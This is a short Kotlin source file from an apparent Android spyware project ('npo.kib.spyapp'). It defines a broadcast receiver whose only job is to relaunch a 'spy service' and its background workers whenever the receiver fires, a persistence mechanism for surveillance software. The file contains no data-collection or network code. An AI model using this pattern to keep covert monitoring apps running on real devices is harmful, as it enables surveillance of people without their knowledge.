package npo.kib.spyapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import npo.kib.spyapp.foreground.launchWorkers
import npo.kib.spyapp.foreground.startSpyService

class RestartReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        Log.d("myLogs", "RestartReceiver onReceive")
        context.startSpyService()
        context.launchWorkers()
    }
}
